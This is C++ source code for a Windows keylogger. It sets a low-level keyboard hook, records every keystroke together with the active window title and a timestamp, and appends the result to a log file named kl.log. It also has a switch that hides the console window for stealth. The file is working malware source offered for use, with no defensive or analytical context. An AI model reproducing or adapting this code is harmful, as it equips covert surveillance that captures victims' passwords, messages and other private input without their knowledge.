#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

#define vis // (vis / invis)
#define FRMT 0
#define mouseign

#if FRMT == 0
const std::map<int, std::string> key_names{
	{VK_BACK, "[BK]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	// truncated for brevity...
};
#endif
HHOOK hook;

KBDLLHOOKSTRUCT kb_struct;

int SaveKey(int key);
std::ofstream out_file;

LRESULT __stdcall CallbackHook(int code, WPARAM wp, LPARAM lp)
{
	if (code >= 0)
	{
		if (wp == WM_KEYDOWN)
		{
			kb_struct = *((KBDLLHOOKSTRUCT*)lp);

			SaveKey(kb_struct.vkCode);
		}
	}

	return CallNextHookEx(hook, code, wp, lp);
}

void HookSet()
{
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, CallbackHook, NULL, 0)))
	{
		LPCWSTR a = L"Fail to set hook!";
		LPCWSTR b = L"Err";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void HookRelease()
{
	UnhookWindowsHookEx(hook);
}


int SaveKey(int key)
{
	std::stringstream out;
	static char last_win[256] = "";
#ifndef mouseign
	if ((key == 1) || (key == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND fg = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (fg)
	{
		threadID = GetWindowThreadProcessId(fg, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (fg)
	{
		char win_title[256];
		GetWindowTextA(fg, (LPSTR)win_title, 256);

		if (strcmp(win_title, last_win) != 0)
		{
			strcpy_s(last_win, sizeof(last_win), win_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			out << "\n\n[Window: " << win_title << " - at " << s << "] ";
		}
	}

#if FRMT == 10
	out << '[' << key << ']';
#elif FRMT == 16
	out << std::hex << "[" << key << ']';
#else
	if (key_names.find(key) != key_names.end())
	{
		out << key_names.at(key);
	}
	else
	{
		char key_code;
		bool lbs = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lbs = !lbs;
		}

		key_code = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, layout);

		if (!lbs)
		{
			key_code = tolower(key_code);
		}
		out << char(key_code);
	}
#endif
	out_file << out.str();
	out_file.flush();

	std::cout << out.str();

	return 0;
}
void StealthMode()
{
#ifdef vis
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invis
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int main()
{
	const char* out_file_name = "kl.log";
	std::cout << "Logging output to " << out_file_name << std::endl;
	out_file.open(out_file_name, std::ios_base::app);

	StealthMode();

	HookSet();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
